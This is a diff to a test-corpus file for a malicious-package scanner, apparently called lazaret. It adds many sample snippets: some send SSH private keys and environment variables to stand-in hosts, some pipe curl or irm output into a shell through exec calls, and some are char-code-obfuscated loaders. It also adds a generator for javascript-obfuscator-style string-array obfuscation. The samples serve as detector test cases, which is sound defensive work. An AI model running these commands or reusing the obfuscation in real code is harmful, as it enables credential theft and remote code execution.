+    "requests.post('https://x.invalid/', json=d)\n",
+    "const fs = require('fs'), os = require('os'), path = require('path');\n"
+    "const key = fs.readFileSync(path.join(os.homedir(), '.ssh/id_ed25519.pub'));\n"
+    "fetch('https://api.telegram.org/bot/sendDocument', { method: 'PUT', body: key });\n",
+    "const fs = require('fs'), os = require('os'), path = require('path');\n"
+    "const key = fs.readFileSync(path.join(os.homedir(), '.ssh/id_ed25519'));\n"
+    "fetch('https://api.telegram.org/bot/sendDocument', { method: 'PUT', body: key });\n",
+    "const t = process.env.GITHUB_TOKEN ? 'yes' : 'no';\nfetch('https://x.invalid/', { method: 'POST', body: t });\n",
+    "if (!process.env.NPM_TOKEN) fetch('https://x.invalid/', { method: 'POST', body: 'none' });\n",
+    "import os, requests\nt = 'set' if os.environ.get('NPM_TOKEN') is not None else ''\n"
+    "requests.post('https://x.invalid/', data=t)\n",
+    # a command runs when it is handed to an exec call: help text and error messages run nothing
+    "console.log('Install with: curl -fsSL https://x.invalid/i.sh | sh');\n",
+    "const s = os === 'win32' ? 'powershell -c \"irm https://x.invalid/i.ps1 | iex\"' : 'curl -fsSL https://x.invalid/i | bash';\n"
+    "throw new Error(`install with ${s}`);\n",
+    "const { execSync } = require('child_process');\nexecSync('curl -s https://x.invalid/i.sh | sh');\n",
+    "const c = 'curl -s https://x.invalid/i.sh | sh';\nrequire('child_process').execSync(c);\n",
+    "import subprocess\nsubprocess.run(['powershell', '-c', 'irm https://x.invalid/i.ps1 | iex'])\n",
+    "import os\nos.system('sh -c \"$(curl -fsSL https://x.invalid/i.sh)\"')\n",
+    "print('sh -c \"$(curl -fsSL https://x.invalid/i.sh)\"')\n",
+    # a child process's environment is the program's: a bundle's helper given it holds no data
+    "var __spreadValues = (a, b) => { for (var prop in b) a[prop] = b[prop]; return a; };\n"
+    "spawn('npm', ['i'], { cwd, env: __spreadValues({}, process.env) });\n"
+    "fetch(url, __spreadValues({ method: 'POST' }, options));\n",
+    "import os, subprocess, requests\nsubprocess.run(['x'], env=dict(os.environ))\nrequests.post(u, data=b)\n",
+]
+CHARCODE_CURATED = [
+    # @fnos/app's shape: a runner's path kept as codes, decoded by the file's own function and started with node
+    "var _d = [" + _cc_fnos("telemetry", 7) + "];\nvar _f = [" + _cc_fnos("runner.js", 3) + "];\n" + CC_FNOS
+    + "spawn(process.execPath, [path.join(__dirname, decodeBuffer(_d, 7), decodeBuffer(_f, 3))], {detached: true});\n",
+    CC_MAP + "const cp = require(" + CC_CALLS[2] + ");\ncp.execSync('curl https://c2.invalid/p | sh');\n",
+    CC_SPLIT + "const o = require(r('pt'));\nrequire('https').get('https://abc.oastify.com/?h=' + o[r('iptuobnf')]());\n",
+    CC_SPREAD + "fetch(" + CC_CALLS[5] + ").then((x) => x.text()).then(eval);\n",
+    CC_PY_RANGE + "import os\nm = __import__(" + CC_CALLS[6] + ")\n",
+    CC_PY_ENUM + "sp = __import__(" + CC_CALLS[7] + ")\nsp.run(['curl', 'https://c2.invalid/p'])\n",
+    CC_PY_ITER + "exec(" + CC_CALLS[8] + ")\n",
+    "const s = String.fromCharCode(104,116,116,112,115,58,47,47,99,50,46,105,110,118,97,108,105,100);\n"
+    "require('https').get(s + '/?e=' + JSON.stringify(process.env));\n",
+    "exec(''.join(map(chr, [105,109,112,111,114,116,32,111,115])))\n",
+    "__import__(bytes([111,115]).decode()).system('id')\n",
+    # not read: a changed array, codes out of range, a transform past 32 bits, a name for an argument
+    "var _w = [" + _cc_fnos("runner.js", 7) + "];\n_w.push(1);\n" + CC_FNOS + "fork(decodeBuffer(_w, 7));\n",
+    "String.fromCharCode(1114112)\nString.fromCharCode(0x110000)\nString.fromCharCode(10, 13)\n",
+    "function d(a, k) { var s = ''; for (var i = 0; i < a.length; i++) s += String.fromCharCode(a[i] << 40); return s; }\n"
+    "d([1, 2], 3)\n",
+    CC_FNOS + "decodeBuffer(x, 7)\ndecodeBuffer([1, 2], k)\n",
+]
 # scripts a script starts with node or python (0.1.8): the calls, flags,
 # path forms and names assigned them, and the pieces around them
 SPAWN = ["\n", "\n", " ", "'", '"', "`", "(", ")", "[", "]", ",", ";", "=", "\\", "/", "..", ".", "-",
@@ -758,7 +1069,12 @@ SPAWN = ["\n", "\n", " ", "'", '"', "`", "(", ")", "[", "]", ",", ";", "=", "\\"
          "__dirname + '/w.js'", "__dirname+\"/q.js\"", "`${__dirname}/t.js`", "`${ __dirname }/u.js`",
          "const script = ", "let here = ", "_d = ", "script", "here", "_d", "f", "const f = path.join(__dirname, 'z.js');",
          "path.join(", "__dirname", "'..'", "'a\\b.js'", "'/abs.js'", "'x'.repeat(3)", "\u00e9", "\U0001F600",
-         "], { detached: true })", "])", ")", "x" * 40]
+         "], { detached: true })", "])", ")", "x" * 40,
+         "execFileSync(bp, [", "spawn('bun', [", "spawn(\"deno\", [", "'run'", "subprocess.run([bun_exec, ",
+         "path.dirname(fileURLToPath(import.meta.url))", "dirname(fileURLToPath(import.meta.url))",
+         "import.meta.dirname", "Path(__file__).parent.resolve()", "SCRIPT_DIR / ENTRY", "SCRIPT_DIR / 'r.js'",
+         "str(entry)", "const D = ", "const E = 'r.js';", "D", "E", "path.join(D, E)", "'x.ts'", "'README.md'",
+         " / "]
 SPAWN_CURATED = [
     "const { spawn } = require('child_process');\nconst path = require('path');\n"
     "const filePath = path.join(__dirname, 'smtp-connection/index.js');\n"
@@ -771,11 +1087,226 @@ SPAWN_CURATED = [
     "subprocess.run([sys.executable, '-m', 'pip', 'install', 'x'])\nspawn('node', ['-e', code])\n",
     "spawn(process.execPath, ['-r', './preload.js', '--no-warnings', 'lib/main.js'])\n",
     "const a = b, c = path.join(__dirname, 'a.js');\nfork(c);\n",
+    # a runtime the script fetched, started on a file of the package (the 2026 setup.mjs loaders)
+    "const D = path.dirname(fileURLToPath(import.meta.url));\nconst E = \"router_init.js\";\n"
+    "const ep = path.join(D, E);\nexecFileSync(bp, [ep], { stdio: \"inherit\", cwd: D });\n",
+    "SCRIPT_DIR = Path(__file__).parent.resolve()\nENTRY_SCRIPT = \"router_runtime.js\"\n"
+    "entry_path = SCRIPT_DIR / ENTRY_SCRIPT\nresult = subprocess.run([bun_exec, str(entry_path)], cwd=SCRIPT_DIR)\n",
+    "spawn('bun', ['run', path.join(__dirname, 'x.ts')]);\nspawn(\"deno\", [\"run\", \"-A\", \"y.ts\"]);\n",
+    "execFile(esbuild, ['--version']);\nspawn(git, ['add', 'x.js']);\nspawn(editor, [path.join(__dirname, 'README.md')]);\n",
+    "const d = import.meta.dirname;\nspawn(bin, [path.join(d, 'w.mjs')]);\n",
 ]
 SHEBANG = ["#!", " ", " ", "\t", "\n", "\r", "/", "/usr/bin/", "/usr/bin/env", "env", "-S", "-i", "-u", "--",
            "node", "NODE", "nodejs", "deno", "bun", "ts-node", "tsx", "python", "python3.12", "py", "pypy",
            "sh", "bash", "zsh", "perl", "A=1", "\u212a", "\u017f", "\x1c", "\xa0", "\x85", "\u0663", "\U0001F600",
            ".exe", "x"]
+
+
+# ---- string arrays and proxy objects (0.1.8): obfuscated files built here, as
+# javascript-obfuscator writes them (the array function, the accessor with
+# its offset and decoding, the rotation loop and its checksum, aliases,
+# wrappers, objects of constants and of proxies), with random names,
+# strings, offsets, rotations and checksums; and their corruptions ----
+_SA_B64 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/="
+
+
+def _sa_btoa(text, alphabet=_SA_B64, pad=False):
+    """javascript-obfuscator's btoa: UTF-8, then base64 over its alphabet."""
+    data = text.encode("utf-8", "surrogatepass")
+    out = []
+    for i in range(0, len(data), 3):
+        chunk = data[i:i + 3]
+        n = int.from_bytes(chunk + b"\0" * (3 - len(chunk)), "big")
+        digits = [(n >> s) & 63 for s in (18, 12, 6, 0)][:len(chunk) + 1]
+        out.extend(alphabet[d] for d in digits)
+        if pad:
+            out.append("=" * (3 - len(chunk)))
+    return "".join(out)
+
+
+def _sa_rc4(text, key):
+    box, j = list(range(256)), 0
+    for i in range(256):
+        j = (j + box[i] + ord(key[i % len(key)])) % 256
+        box[i], box[j] = box[j], box[i]
+    i = j = 0
+    out = []
+    for ch in text:
+        i = (i + 1) % 256
+        j = (j + box[i]) % 256
+        box[i], box[j] = box[j], box[i]
+        out.append(chr(ord(ch) ^ box[(box[i] + box[j]) % 256]))
+    return "".join(out)
+
+
+def _sa_lit(s, rnd):
+    """A JavaScript single-quoted literal of s, escapes chosen at random."""
+    out = []
+    for ch in s:
+        o = ord(ch)
+        if ch in "'\\":
+            out.append("\\" + ch)
+        elif ch == "\n":
+            out.append(rnd.choice(["\\n", "\\x0a", "\\u000a"]))
+        elif o < 0x20 or o == 0x7f:
+            out.append("\\x%02x" % o)
+        elif o > 0xffff:
+            out.append("\\u{%x}" % o)
+        elif o > 0x7e and rnd.random() < 0.5:
+            out.append("\\u%04x" % o)
+        elif ch == " " and rnd.random() < 0.3:
+            out.append("\\x20")
+        else:
+            out.append(ch)
+    return "'" + "".join(out) + "'"
+
+
+def _sa_name(rnd, used):
+    while True:
+        name = rnd.choice(["_0x", "a0_0x", "_$", "q"]) + "".join(rnd.choice("0123456789abcdef") for _ in range(rnd.randint(3, 6)))
+        if name not in used:
+            used.add(name)
+            return name
+
+
+def _sa_num(n, rnd):
+    """n written as the obfuscator writes numbers: hex, decimal or an arithmetic of them."""
+    k = rnd.random()
+    if k < 0.4:
+        return hex(n) if n >= 0 else "-" + hex(-n)
+    if k < 0.6:
+        return str(n)
+    a = rnd.randint(1, 0x3ff)
+    b = rnd.randint(1, 9)
+    c = n - a * b
+    return "(" + hex(a) + "*" + hex(b) + ("+" if c >= 0 else "-") + hex(abs(c)) + ")"
+
+
+_SA_WORDS = ["child_process", "exec", "https", "request", "hostname", "env", "toString", "readFileSync", "http://x.invalid/c",
+             "push", "shift", "length", "fromCharCode", "log", "Error sending log:", "café", "日本", "\U0001F600",
+             "line\nbreak", "quote'd", "back\\slash", "", " ", "0x1f", "12abc", "-7", "require", "os", "platform"]
+
+
+def strarr_case(rnd):
+    """One obfuscated file: kind, rotation, wrappers, constants and proxies at random."""
+    used = set()
+    fn, arr, acc, alias = (_sa_name(rnd, used) for _ in range(4))
+    kind = rnd.choice(["plain", "plain", "base64", "rc4"])
+    strings = [rnd.choice(_SA_WORDS) + (str(rnd.randint(0, 99)) if rnd.random() < 0.3 else "") for _ in range(rnd.randint(4, 24))]
+    terms = rnd.randint(2, 5)
+    for _ in range(terms):                              # the checksum's strings: a number, then letters
+        strings.append(str(rnd.randint(1, 999999)) + "".join(rnd.choice("abcdefXYZ") for _ in range(rnd.randint(0, 5))))
+    rnd.shuffle(strings)
+    n = len(strings)
+    off = rnd.randint(0, 0x3ff)
+    keys = ["".join(rnd.choice("abcdefgh#@()!$%") for _ in range(4)) for _ in range(3)]
+    stored, key_of = [], {}
+    for i, s in enumerate(strings):
+        if kind == "plain":
+            stored.append(s)
+        elif kind == "base64":
+            stored.append(_sa_btoa(s, pad=rnd.random() < 0.1))
+        else:
+            key = rnd.choice(keys)
+            key_of[i] = key
+            stored.append(_sa_btoa(_sa_rc4(s, key)))
+    rot = rnd.randint(0, n - 1)
+    file_items = stored[-rot:] + stored[:-rot] if rot else list(stored)   # (rotated left `rot` times at run time)
+    src = []
+    src.append("function " + fn + "(){const " + arr + "=[" + ",".join(_sa_lit(s, rnd) for s in file_items) + "];"
+               + fn + "=function(){return " + arr + ";};return " + fn + "();}")
+    p1, p2, q1, q2, cache = (_sa_name(rnd, used) for _ in range(5))
+    body = ""
+    if kind != "plain":
+        body = "if(" + acc + "['x']===undefined){var d=function(s){const a='" + _SA_B64 + "';return s;};" + acc + "['x']=!![];}"
+    if rnd.random() < 0.5:
+        src.append("function " + acc + "(" + p1 + "," + p2 + "){" + p1 + "=" + p1 + "-" + _sa_num(off, rnd) + ";const "
+                   + cache + "=" + fn + "();let v=" + cache + "[" + p1 + "];" + body + "return v;}")
+    else:
+        src.append("function " + acc + "(" + p1 + "," + p2 + "){const " + cache + "=" + fn + "();return " + acc + "=function("
+                   + q1 + "," + q2 + "){" + q1 + "=" + q1 + "-" + _sa_num(off, rnd) + ";let v=" + cache + "[" + q1 + "];"
+                   + body + "return v;}," + acc + "(" + p1 + "," + p2 + ");}")
+    src.append("const " + alias + "=" + acc + ";")
+    wrapper, shift = None, 0
+    if rnd.random() < 0.5:                              # a wrapper that shifts the index
+        wrapper = _sa_name(rnd, used)
+        shift = rnd.randint(-0x80, 0x80)
+        a, b, c = (_sa_name(rnd, used) for _ in range(3))
+        wshift = ("- -" + hex(shift)) if shift >= 0 else ("-" + hex(-shift))
+        if rnd.random() < 0.5:
+            wshift = ("- -'" + hex(shift) + "'") if shift >= 0 else ("-'" + hex(-shift) + "'")
+        src.append("function " + wrapper + "(" + a + "," + b + "," + c + "){return " + alias + "(" + c + wshift + "," + a + ");}")
+
+    def call(i, name=None):
+        """A call that reads strings[i] (index as the obfuscator writes it)."""
+        idx = i + off
+        key = key_of.get(i)
+        keylit = "," + _sa_lit(key, rnd) if key is not None else ""
+        if wrapper is not None and (name is None and rnd.random() < 0.6):
+            k = idx - shift
+            return wrapper + "(" + (_sa_lit(key, rnd) if key is not None else "0x0") + "," + hex(rnd.randint(0, 99)) + "," + _sa_num(k, rnd) + ")"
+        return (name or rnd.choice([acc, alias])) + "(" + _sa_num(idx, rnd) + keylit + ")"
+
+    # the checksum loop: its terms read the numbered strings
+    numbered = [i for i, s in enumerate(strings) if s[:1].isdigit()]
+    chosen = numbered[:terms]
+    expr, value = "", 0.0
+    from lazaret.scanner import core as _core
+    for k, i in enumerate(chosen):
+        div = rnd.randint(1, 12)
+        sign = rnd.choice(["", "-"])
+        term = sign + "parseInt(" + call(i) + ")/" + hex(div)
+        v = (-1 if sign else 1) * _core._sa_parse_int(strings[i]) / div
+        if k and rnd.random() < 0.4:
+            mul = rnd.randint(1, 9)
+            term = "(" + term + ")*" + hex(mul)
+            v = v * mul
+        expr = term if not expr else expr + "+" + term
+        value = v if k == 0 else value + v
+    target = value
+    target_src = repr(target) if target != int(target) else _sa_num(int(target), rnd)
+    g, a2 = _sa_name(rnd, used), _sa_name(rnd, used)
+    src.append("(function(" + a2 + ",t){const " + g + "=" + acc + "," + arr + "2=" + a2 + "();while(!![]){try{const v=" + expr
+               + ";if(v===t)break;else " + arr + "2['push'](" + arr + "2['shift']());}catch(e){" + arr + "2['push']("
+               + arr + "2['shift']());}}}(" + fn + "," + target_src + "));")
+    # uses: direct, through an object of constants, and through a proxy object
+    consts = _sa_name(rnd, used)
+    picks = [rnd.randrange(n) for _ in range(rnd.randint(2, 6))]
+    ckeys = ["_0x" + "".join(rnd.choice("0123456789abcdef") for _ in range(5)) for _ in picks]
+    src.append("const " + consts + "={" + ",".join(ck + ":" + hex(i + off) for ck, i in zip(ckeys, picks)) + "};")
+    for ck, i in zip(ckeys, picks):
+        key = key_of.get(i)
+        src.append("x[" + alias + "(" + consts + "." + ck + ("," + _sa_lit(key, rnd) if key is not None else "") + ")];")
+    for i in rnd.sample(range(n), min(n, 6)):
+        src.append("y(" + call(i) + ");")
+    if rnd.random() < 0.6:
+        px, pc, pb, ps = _sa_name(rnd, used), "kCall", "kOp", "kStr"
+        src.append("const " + px + "={'" + pc + "':function(f,a,b){return f(a,b);},'" + pb + "':function(a,b){return a"
+                   + rnd.choice(["===", "+", "<", " in ", "&&"]) + "b;},'" + ps + "':'child_proc'+'ess'};")
+        src.append(px + "['" + pc + "'](require," + px + "['" + ps + "'],\n" + call(0) + ");if(" + px + "['" + pb
+                   + "'](1," + px + "['" + pc + "'](g,1,2))){}")
+    text = "\n".join(src) if rnd.random() < 0.5 else "".join(src)
+    r = rnd.random()
+    if r < 0.15:                                        # corruptions: cut, a character changed, doubled
+        text = text[:rnd.randint(0, len(text))]
+    elif r < 0.3:
+        i = rnd.randrange(len(text))
+        text = text[:i] + rnd.choice("'\"(){}[];,=+-0x\\ ") + text[i + 1:]
+    elif r < 0.35:
+        text = text + "\n" + text
+    return text
+
+
+STRARR_CURATED = [
+    # a plain array, the accessor that replaces itself, a checksum loop, an alias
+    "function _0x3005(){const _0x1a7e=['error','1639918bmtUOu','env','http://x.invalid/c','8MAyWuw',"
+    "'670455OteXAv'];_0x3005=function(){return _0x1a7e;};return _0x3005();}"
+    "function _0x2c79(a,b){const c=_0x3005();return _0x2c79=function(d,e){d=d-0x1d1;let f=c[d];return f;},_0x2c79(a,b);}"
+    "const _0x33e1=_0x2c79;(function(a,b){const g=_0x2c79,h=a();while(!![]){try{const i=parseInt(g(0x1d2))/0x1;"
+    "if(i===b)break;else h['push'](h['shift']());}catch(j){h['push'](h['shift']());}}}(_0x3005,0x1905ee));"
+    "fetch(_0x33e1(0x1d4),{'method':'POST','body':process[_0x33e1(0x1d3)]});",
+]
+
 
 
 def corpus(seed=20260926, scale=1):
@@ -786,13 +1317,17 @@ def corpus(seed=20260926, scale=1):
     JavaScript string cannot)."""
     rnd = random.Random(seed)
     cases = (list(CURATED) + SIGN_CURATED + PROSE_CURATED + SELF_CURATED + PERSIST_CURATED + PUBLISH_CURATED
-             + DECODED_CURATED + SPAWN_CURATED + EXFIL_CURATED + SERVICE_CURATED + XOR_CURATED)
+             + DECODED_CURATED + SPAWN_CURATED + EXFIL_CURATED + SERVICE_CURATED + XOR_CURATED
+             + CHARCODE_CURATED + FLOW_CURATED + STRARR_CURATED)
     for pieces, count, most in ((MIXED, 2500, 14), (QUOTING, 1500, 16), (CD, 1500, 16), (NODE_E, 1500, 16),
                                 (SCRIPT, 1000, 12), (RECEIVED, 1500, 16), (SIGNS, 2000, 10), (PROSE, 2500, 16),
                                 (SELF, 1500, 14), (SELF_ASYNC, 2000, 12), (PERSIST, 2500, 10), (PUBLISH, 3000, 12), (DECODED, 4000, 12), (SPAWN, 3000, 10),
-                                (EXFIL, 2500, 10), (SERVICES, 2500, 10), (XOR, 1500, 10), (EXFIL_MORE, 2000, 10)):
+                                (EXFIL, 2500, 10), (SERVICES, 2500, 10), (XOR, 1500, 10), (EXFIL_MORE, 2000, 10),
+                                (CHARCODE, 1200, 10), (FLOW, 2000, 10)):
         for _ in range(count * scale):
             cases.append("".join(rnd.choice(pieces) for _ in range(rnd.randint(1, most))))
+    for _ in range(600 * scale):                    # obfuscated files: string arrays and proxy objects
+        cases.append(strarr_case(rnd))
     for _ in range(1500 * scale):                   # #! lines: an interpreter, then anything
         head = rnd.choice(["", " ", "\t", "/usr/bin/", "/usr/bin/env ", "/usr/bin/env -S ", "env\t", "/bin/", "\n"])
         name = rnd.choice(["node", "NODE", "nodejs", "deno", "bun", "ts-node", "tsx", "python", "python3.12", "PY",
@@ -802,15 +1337,29 @@ def corpus(seed=20260926, scale=1):
     return [json.loads(json.dumps(text)) for text in cases]
 
 
+def shard(cases):
+    """The cases of this run: all of them, or with LAZARET_PARITY_SHARD=k/n
+    (1 <= k <= n) every n-th one from the k-th, so that a machine that
+    limits each run's time can read the corpus in n runs (CI reads it
+    whole)."""
+    spec = os.environ.get("LAZARET_PARITY_SHARD", "")
+    if not spec:
+        return cases
+    k, n = (int(x) for x in spec.split("/"))
+    if not 1 <= k <= n:
+        raise ValueError(f"LAZARET_PARITY_SHARD={spec!r}: k/n with 1 <= k <= n")
+    return cases[k - 1::n]
+
+
+def sharded():
+    """Is this run reading a shard of the corpus (see shard)?"""
+    return bool(os.environ.get("LAZARET_PARITY_SHARD", ""))
+
+
 def shlex_tokens(cmd):
-    """_hook_tokens' shlex reading of cmd, or None where shlex raises."""
-    try:
-        lex = shlex.shlex(cmd, posix=True, punctuation_chars=True)
-        lex.whitespace_split = True
-        lex.commenters = ""
-        return list(lex)
-    except ValueError:
-        return None
+    """_hook_tokens' shlex reading of cmd, or None where shlex raises (core's
+    own, which keeps the last command's tokens for the calls after it)."""
+    return core._hook_shlex(cmd)
 
 
 def core_view(text):
